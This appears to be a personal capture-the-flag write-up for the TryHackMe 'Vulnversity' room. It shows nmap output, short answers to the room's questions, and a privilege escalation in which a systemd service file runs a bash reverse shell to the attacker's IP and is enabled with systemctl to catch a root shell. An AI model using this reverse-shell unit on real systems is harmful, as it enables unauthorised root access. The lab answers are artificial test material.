# Vuln University

[Play](https://tryhackme.com/room/vulnversity)

## Task 1 - Deploy the machine
ezpz

## Task 2 - Recon

```
❯ nmap -sC -sV -A 10.10.197.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST
Nmap scan report for 10.10.197.89
Host is up (0.18s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-03-07T21:43:45-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-08T02:43:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds

```

### Scan the box, how many ports are open?
`6`

### What version of the squid proxy is running on the machine?
`3.5.12`

### How many ports will nmap scan if the flag -p-400 was used?
`400`

### Using the nmap flag -n what will it not resolve?
`dns`

### What is the most likely operating system this machine is running?
`ubuntu`

### What port is the web server running on?
`3333`

### Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
ok

## Task 3 - Locating directories using gobuster
### What is the directory that has an upload form page?
`/include/`

## Task 4 - Compromise the webserver


```
www-data@vulnuniversity:/var/www/html/internal/uploads$ cat root.service
cat root.service
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'

[Install]
WantedBy=multi-user.target
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable root.service
<r/www/html/internal/uploads$ /bin/systemctl enable             root.service 
Failed to execute operation: No such file or directory
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable ./root.service
<r/www/html/internal/uploads$ /bin/systemctl enable             ./root.service
Failed to execute operation: Invalid argument
www-data@vulnuniversity:/var/www/html/internal/uploads$ pwd
pwd
/var/www/html/internal/uploads
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service
<s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service        
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service.
Created symlink from /etc/systemd/system/root.service to /var/www/html/internal/uploads/root.service.
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl start root.service
<r/www/html/internal/uploads$ /bin/systemctl start root.service 
```


```
❯ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.185.229] 43756
bash: cannot set terminal process group (1792): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls
ls
root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
{hell yeah}
root@vulnuniversity:~# 
```